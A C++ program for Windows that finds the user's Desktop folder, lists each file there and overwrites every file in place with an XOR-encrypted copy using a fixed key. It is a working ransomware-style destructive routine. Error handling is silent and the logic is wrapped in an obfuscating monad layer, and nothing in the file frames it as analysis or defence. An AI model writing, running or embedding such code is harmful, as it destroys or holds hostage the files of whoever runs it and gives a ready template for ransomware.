#include <iostream>
#include <filesystem>
#include <string>
#include <windows.h>
#include <shlobj.h>
#include <functional>
#include <vector>
#include <fstream>

namespace fs = std::filesystem;
template<typename T>
using Func = std::function<T>;
template<typename T>

class Monad {
public:
    Monad(const T& value) : value_(value) {}
    template<typename F>
    auto bind(F f) const -> decltype(f(value_)) {
        return f(value_);
    }
    
    T value() const { return value_; }
private:
    T value_;
};

// sep Monad for void
template<>
class Monad<void> {
public:
    Monad() {}
    template<typename F>
    auto bind(F f) const -> decltype(f()) {
        return f();
    }
    void value() const {}
};

class IO {
public:
    template<typename F>
    static auto perform(F f) -> decltype(f()) {
        return f();
    }
};

Func<std::string()> getDesktop = []() -> std::string {
    PWSTR path;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &path))) {
        std::wstring ws(path);
        CoTaskMemFree(path);
        return std::string(ws.begin(), ws.end());
    }
    return "";
};

Func<void(const std::string&)> encryptFile = [](const std::string& filePath) {
    try {
        std::ifstream inFile(filePath, std::ios::binary);
        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();
        for (char& byte : buffer) {
            byte ^= 0xAA; //XOR key - 0xAA for demonstration
        }
        std::ofstream outFile(filePath, std::ios::binary);
        outFile.write(buffer.data(), buffer.size());
        outFile.close();
    } catch (const std::exception&) {
        return;
    }
};

Func<void(const std::string&)> listAndEncryptFiles = [](const std::string& path) {
    for (const auto& entry : fs::directory_iterator(path)) {
        try {
            std::string filePath = entry.path().string();
            std::cout << entry.path().filename().string() << std::endl;
            encryptFile(filePath);
        } catch (const std::exception&) {
            continue;
        }
    }
};

Func<Monad<std::string>()> getChkDesktop = []() -> Monad<std::string> {
    return Monad<std::string>(getDesktop())
        .bind([](const std::string& path) -> Monad<std::string> {
            return path.empty() ? Monad<std::string>("") : Monad<std::string>(path);
        });
};

int main() {
    auto deskRes = getChkDesktop()
        .bind([](const std::string& path) -> Monad<std::string> {
            if (path.empty()) {
                exit(1);
            }
            return Monad<std::string>(path);
        });
    deskRes.bind([](const std::string& path) -> Monad<void> {
        listAndEncryptFiles(path);
        return Monad<void>();
    });
    return 0;
}
